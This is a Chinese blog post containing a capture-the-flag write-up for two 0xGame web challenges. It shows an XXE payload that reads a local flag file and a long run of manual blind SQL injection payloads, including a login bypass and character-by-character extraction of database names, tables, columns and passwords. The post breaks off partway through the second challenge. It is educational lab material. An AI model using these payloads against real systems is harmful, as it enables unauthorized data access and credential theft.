@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32px.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16px.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"casio-3.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0xGame 第三周-WebWriteUp by Casio1. inject_me测试的几条注入都无效，几个特殊字符都原样返回，看看到底发送了什么请求： 1&lt;user&gt;&lt;username&gt;1&#39;&lt;&#x2F;username&gt;&lt;password&gt;2&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;  诶~有点意思">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGame Week3">
+<meta property="og:url" content="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%89%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/index.html">
+<meta property="og:site_name" content="Where is your love?">
+<meta property="og:description" content="0xGame 第三周-WebWriteUp by Casio1. inject_me测试的几条注入都无效，几个特殊字符都原样返回，看看到底发送了什么请求： 1&lt;user&gt;&lt;username&gt;1&#39;&lt;&#x2F;username&gt;&lt;password&gt;2&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;  诶~有点意思">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/2hxzWtC9ajBRwDm.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/3zvQB5bFslaL8ec.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/3bKdPJ5OHstT7Bm.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/17/BLWvI724lPKZsiN.png">
+<meta property="article:published_time" content="2020-10-27T16:00:03.000Z">
+<meta property="article:modified_time" content="2021-03-17T12:29:34.632Z">
+<meta property="article:author" content="Casio3">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/17/2hxzWtC9ajBRwDm.png">
+
+<link rel="canonical" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%89%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>0xGame Week3 | Where is your love?</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"><a target="_blank" rel="noopener" href="https://github.com/Casio-3/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Where is your love?</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://casio-3.github.io/2020/10/28/0xGame%20%E7%AC%AC%E4%B8%89%E5%91%A8-Web(%E7%BC%BA%E4%B8%80%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Casio3">
+      <meta itemprop="description" content="Little trix">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Where is your love?">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          0xGame Week3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-28 00:00:03" itemprop="dateCreated datePublished" datetime="2020-10-28T00:00:03+08:00">2020-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-17 20:29:34" itemprop="dateModified" datetime="2021-03-17T20:29:34+08:00">2021-03-17</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0xGame-第三周-Web"><a href="#0xGame-第三周-Web" class="headerlink" title="0xGame 第三周-Web"></a>0xGame 第三周-Web</h1><h2 id="WriteUp-by-Casio"><a href="#WriteUp-by-Casio" class="headerlink" title="WriteUp by Casio"></a>WriteUp by Casio</h2><h3 id="1-inject-me"><a href="#1-inject-me" class="headerlink" title="1. inject_me"></a>1. inject_me</h3><p>测试的几条注入都无效，几个特殊字符都原样返回，看看到底发送了什么请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;1&#39;&lt;&#x2F;username&gt;&lt;password&gt;2&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>诶~有点意思，再<strong>F12</strong>经过一番仔细挖掘，找到了核心<em>Js</em>:<a id="more"></a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		alert(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        url: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.getElementsByTagName(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).text(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).text(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>😓，一直往着<strong>SQL</strong>注入上面靠，想着强行改成text那样发送<em>payload</em>，</p>
+<p>曲折一番之后查找到<strong>XML</strong>相关，学习<strong>XXE</strong>漏洞：</p>
+<blockquote>
+<p><strong>XXE</strong>(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞.</p>
+</blockquote>
+<p>阅读了一些文章，大致了解了在CTF中的注入方法（至于<strong>XML</strong>则没有深入了解）</p>
+<p>直接就可以梭出来的<em>payload</em>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE any [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;1&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/03/17/2hxzWtC9ajBRwDm.png" alt="image-20201028221816613"></p>
+<p><img src="https://i.loli.net/2021/03/17/3zvQB5bFslaL8ec.png" alt="image-20201028221726402"></p>
+<p>这里使用了<code>&amp;xxe</code>来对上面的xxe<strong>实体</strong>进行了引用，达到了读取<em>flag</em>的效果。。。</p>
+<p>==&gt;&gt;<font color="red"><strong><em>0xGame{V2ry_simple_XXE}</em></strong></font></p>
+<p>//<font color="blue">直接盲读flag成功了是我没想到的，但CSDN上确有与此几乎相同的题；另外学习的某篇文章里用的测试网站的样式也与本题是一样的，只不过是留的图片告诉了flag.php的位置</font></p>
+<p>有的还可以将<em>Content-Type</em>从json改成<em>xml</em>来实现注入：</p>
+<blockquote>
+<p>发现是<strong>AJAX</strong>异步传送数据<br>在一般的异步网站都会有异步数据与服务器的交互，一般传送数据为json但如果将传送的数据格式改为xml。有很大的可能服务器会解析你异步上传的xml脚本执行想要干的事</p>
+</blockquote>
+<h3 id="2-close-eyes"><a href="#2-close-eyes" class="headerlink" title="2. close_eyes"></a>2. close_eyes</h3><p>看界面推测是之前<strong>SQL</strong>的进阶，题目暗示<em>盲注</em>.</p>
+<p>测试后已知的回显：</p>
+<blockquote>
+<p>数据库里没你这号人,别想骗劳资.jpg    //后文以F表示</p>
+<p>数据库有你这号人，那又怎么着？    //后问以T表示</p>
+</blockquote>
+<p>因为不会脚本，所以略去全程漫长的测试试验。。。（其实还是水了一大段无用的字数</p>
+<ul>
+<li><p>判读注入之万能登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39;or 1#&amp;password&#x3D;Casio</span><br><span class="line">&#x2F;&#x2F;return T</span><br></pre></td></tr></table></figure>
+
+<p><font color="blue" face="楷体">注：因password部分被注释掉了，后面的payload皆为username中所填</font></p>
+</li>
+<li><p><del>联合查询</del></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select 1,2#</span><br><span class="line">&#x2F;&#x2F;return F</span><br><span class="line">&#39;union select 1#</span><br><span class="line">&#x2F;&#x2F;return T</span><br></pre></td></tr></table></figure>
+
+<p>本步可以意识到<em>盲注</em>需求.</p>
+</li>
+<li><p>猜解数据库长度、名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#39;or length(database())&gt;1#</span><br><span class="line">&#x2F;&#x2F;return T</span><br><span class="line">&#39;or length(database())&gt;5#</span><br><span class="line">&#x2F;&#x2F;return F</span><br><span class="line">...</span><br><span class="line">&#39;or length(database())&#x3D;4#</span><br><span class="line">&#x2F;&#x2F;return T</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;库名字符串长度为4</span><br><span class="line">——漫长岁月——</span><br><span class="line">...</span><br><span class="line">&#39;or ascii(substr(database(),1,1))&gt;&#39;110&#39;#</span><br><span class="line">&#x2F;&#x2F;return T</span><br><span class="line">...</span><br><span class="line">&#39;or ascii(substr(database(),1,1))&gt;&#39;118&#39;#</span><br><span class="line">&#x2F;&#x2F;return F</span><br><span class="line">...</span><br><span class="line">&#39;or ascii(substr(database(),1,1))&#x3D;&#39;117&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#x3D;&#x3D;&gt;第一个字符为u，经验主义者都猜user	&#x2F;&#x2F;事实如此</span><br><span class="line">&#39;or database()&#x3D;&#39;user&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆表（我不会查询表的数目。。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),1,1)))&gt;&#39;97&#39;#</span><br><span class="line">&#x2F;&#x2F;return T</span><br><span class="line">......(二分法查询会快一点点)</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),1,1)))&gt;&#39;116&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),1,1)))&gt;&#39;117&#39;#</span><br><span class="line">&#x2F;&#x2F;F</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;①u</span><br><span class="line">&#x2F;&#x2F;难道还是user？</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),2,1)))&#x3D;&#39;115&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;②s</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),3,1)))&#x3D;&#39;101&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;③e</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),4,1)))&#x3D;&#39;114&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;④r</span><br><span class="line">逗号有无？</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),5,1)))&#x3D;&#39;44&#39;#</span><br><span class="line">&#x2F;&#x2F;F</span><br><span class="line">真的只有一张表吗？</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;user&quot;),5,1)))&gt;&#39;32&#39;#</span><br><span class="line">&#x2F;&#x2F;F</span><br><span class="line">但愿如此</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#39;or (ascii(substr((Select group_concat(column_name) from Information_schema.columns where table_name&#x3D;&quot;user&quot;),1,1)))&gt;&#39;32&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">——盲猜flag——</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(column_name) from Information_schema.columns where table_name&#x3D;&quot;user&quot;),1,1)))&#x3D;&#39;102&#39;#</span><br><span class="line">&#x2F;&#x2F;F</span><br><span class="line">——冲动了😓——</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(column_name) from Information_schema.columns where table_name&#x3D;&quot;user&quot;),1,1)))&gt;&#39;102&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">...</span><br><span class="line">&#x3D;105&#x2F;&#x2F;T&#x3D;&#x3D;&gt;&gt;①i</span><br><span class="line">——我还是要猜一手id——</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F;确实如此</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;第一列id</span><br><span class="line">——这次有逗号吗？——</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(column_name) from Information_schema.columns where table_name&#x3D;&quot;user&quot;),3,1)))&#x3D;&#39;44&#39;#</span><br><span class="line">&#x2F;&#x2F;T，真的有诶</span><br><span class="line">——题目如此友好，这回应该是flag了——</span><br><span class="line">。。。认输了，是username啊（本来又猜了一手user，逗号判定的时候发现还没完）</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;第二列username</span><br><span class="line">&#39;or (ascii(substr((Select group_concat(column_name) from Information_schema.columns where table_name&#x3D;&quot;user&quot;),12,1)))&#x3D;&#39;44&#39;#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;存在第三列，这回。。。</span><br><span class="line">...</span><br><span class="line">&#x3D;&#x3D;&gt;&gt;第三列password</span><br><span class="line">后面无了</span><br></pre></td></tr></table></figure>
+
+<p>隔了几天重新做。。。😓</p>
+</li>
+<li><p>回头看看有几个库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#39;or (select count(schema_name) from information_schema.schemata)&gt;0#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#39;or (select count(schema_name) from information_schema.schemata)&gt;1#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#39;or (select count(schema_name) from information_schema.schemata)&gt;2#</span><br><span class="line">&#x2F;&#x2F;F</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>看看叫啥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;or (select length(schema_name) from information_schema.schemata limit 0,1)&#x3D;18#</span><br><span class="line">&#x2F;&#x2F;T	第一个库的长度为18，information_schema没跑了</span><br><span class="line">那么剩下的对应user了</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>延续之前的字段爆数据（之前一直不对，后来发现加limit限制才能爆到数据）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">——id——</span><br><span class="line">&#39;or (ascii(substr((Select id from user.user limit 0,1),1,1)))&#x3D;49#</span><br><span class="line">&#x2F;&#x2F;T id&#x3D;1</span><br><span class="line">&#39;or (ascii(substr((Select id from user.user limit 1,1),1,1)))&#x3D;50#</span><br><span class="line">&#x2F;&#x2F;T id&#x3D;2</span><br><span class="line">——username——</span><br><span class="line">没爆，我直接猜flag在password那里</span><br><span class="line">——password——</span><br><span class="line">...</span><br><span class="line">&#39;or (length((select password from user.user limit 0,1))&#x3D;16)#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><font color="blue">因为知道开头是0xgame所以强行去找asiic码是’48’的开头</font></p>
+</li>
+<li><p>拿flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),1,1))&#x3D;48)#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),2,1))&#x3D;120)#</span><br><span class="line">&#x2F;&#x2F;T</span><br><span class="line">0x已经获取，可以说很有精神了( •̀ ω •́ )y</span><br><span class="line">来一次大跃进：</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),7,1))&#x3D;123)#</span><br><span class="line">&#x2F;&#x2F;T 0xGame&#123;,第七位的括号拿到了</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),7,1))&#x3D;123)#</span><br><span class="line">——以下是漫长的试探所得的pass语句。。。。——</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),8,1))&#x3D;98)# 	&#x2F;&#x2F;b</span><br><span class="line">&#39;or (ascii(substr((select password from user.user limit 3,1),9,1))&#x3D;108)# 	&#x2F;&#x2F;l</span><br><span 